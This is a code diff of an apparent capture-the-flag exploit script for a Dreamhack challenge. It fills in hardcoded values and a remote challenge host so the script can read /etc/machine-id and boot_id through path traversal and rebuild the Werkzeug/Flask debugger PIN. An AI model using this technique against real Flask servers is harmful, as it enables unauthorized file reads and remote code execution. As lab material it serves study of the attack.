@@ -9,21 +9,21 @@ import flask
 
 app = flask.Flask(__name__)
 
-modname = getattr(app, "__module__", t.cast(object, app).__class__.__module__)
+# modname = getattr(app, "__module__", t.cast(object, app).__class__.__module__)
 
-try:
-    import getpass
-    username = getpass.getuser()
-except (ImportError, KeyError, OSError):
-    username = None
+# try:
+#     import getpass
+#     username = getpass.getuser()
+# except (ImportError, KeyError, OSError):
+#     username = None
 
-mod = sys.modules.get(modname)
+# mod = sys.modules.get(modname)
 
 probably_public_bits = [
-    username,
-    modname,
-    getattr(app, "__name__", type(app).__name__),
-    getattr(mod, "__file__", None)
+    'dreamhack',
+    'flask.app',
+    'Flask',                        #getattr(app, "__name__", type(app).__name__),
+    '/usr/local/lib/python3.8/site-packages/flask/app.py'         #getattr(sys.modules.get('flask.app'), "__file__", None),
 ]
 
 def send_payload(url):
@@ -52,7 +52,7 @@ def send_payload(url):
     return None
 
 def get_machine_id():
-    HOST = "http://localhost:12345/../../../../.."
+    HOST = "http://host3.dreamhack.games:19337/../../../../.."
     linux = ""
 
     for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
@@ -67,10 +67,10 @@ def get_machine_id():
 
     return linux
 
-private_bits = [str(uuid.getnode()), get_machine_id()]
+private_bits = ["187999308729601", get_machine_id()]
 
 h = hashlib.md5()
-# h = hashlib.sha1()
+#h = hashlib.sha1()
 
 for bit in chain(probably_public_bits, private_bits):
     if not bit:
